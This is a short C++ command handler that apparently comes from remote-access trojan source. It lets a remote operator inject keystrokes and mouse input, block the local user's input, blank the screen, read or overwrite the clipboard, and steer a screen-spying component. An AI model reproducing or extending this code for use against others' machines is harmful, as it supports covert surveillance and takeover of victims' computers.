void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	try
	{
 		switch (lpBuffer[0])
 		{
		case COMMAND_NEXT:
			NotifyDialogIsOpen();
			break;
		case COMMAND_SCREEN_RESET:
			ResetScreen(*(LPBYTE)&lpBuffer[1]);
			break;
		case COMMAND_ALGORITHM_RESET:
			m_bAlgorithm = *(LPBYTE)&lpBuffer[1];
			m_pScreenSpy->setAlgorithm(m_bAlgorithm);
			break;
		case COMMAND_SCREEN_CTRL_ALT_DEL:
			::SimulateCtrlAltDel();
			break;
		case COMMAND_SCREEN_CONTROL:
			{
				BlockInput(false);
				ProcessMouseAndKeyCommand(lpBuffer + 1, nSize - 1);
				BlockInput(m_bIsBlockInput);
			}
			break;
		case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread里锁定
			m_bIsBlockInput = *(LPBYTE)&lpBuffer[1];
			break;
		case COMMAND_SCREEN_BLANK:
			m_bIsBlankScreen = *(LPBYTE)&lpBuffer[1];
			break;
		case COMMAND_SCREEN_CAPTURE_LAYER:
			m_bIsCaptureLayer = *(LPBYTE)&lpBuffer[1];
			m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
			break;
		case COMMAND_SCREEN_GET_CLIPBOARD:
			SendLocalClipboard();
			break;
		case COMMAND_SCREEN_SET_CLIPBOARD:
			UpdateLocalClipboard((char *)lpBuffer + 1, nSize - 1);
			break;
		default:
			break;
		}
	}catch(...){}
}